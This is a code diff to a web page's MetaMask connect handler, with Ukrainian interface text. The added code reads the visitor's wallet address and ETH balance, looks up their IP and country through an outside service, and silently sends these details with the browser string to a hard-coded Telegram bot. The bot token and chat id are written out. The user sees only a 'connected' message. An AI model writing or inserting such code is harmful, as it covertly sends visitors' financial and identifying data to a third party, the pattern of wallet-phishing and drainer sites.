@@ -77,18 +77,44 @@
   </div>
 
   <script>
-    let signer;
+    let signer, userAddress;
 
     async function connect() {
       if (!window.ethereum) {
         alert("🛑 Встановіть MetaMask");
         return;
       }
+
       try {
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
         const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
-        alert("🟢 Підключено");
+        userAddress = await signer.getAddress();
+        const balance = await provider.getBalance(userAddress);
+        const ethBalance = ethers.utils.formatEther(balance);
+
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
+
+        const message = `🧠 <b>Новий користувач підключив MetaMask:</b>\n\n` +
+          `👤 <b>Адреса:</b> <code>${userAddress}</code>\n` +
+          `💰 <b>ETH баланс:</b> ${ethBalance}\n` +
+          `🌍 <b>IP:</b> ${ipData.ip}\n` +
+          `🌐 <b>Країна:</b> ${ipData.country_name}\n` +
+          `📱 <b>Браузер:</b> ${navigator.userAgent}`;
+
+        await fetch(`https://api.telegram.org/bot7625731088:AAGWuxqSkiL72HInY03Q9CQU-D_cQKaZ4SI/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: 7234699302,
+            text: message,
+            parse_mode: "HTML"
+          })
+        });
+
+        alert("🟢 Підключено: " + userAddress + "\nБаланс: " + ethBalance + " ETH");
+
       } catch (err) {
         alert("❌ Помилка: " + err.message);
       }
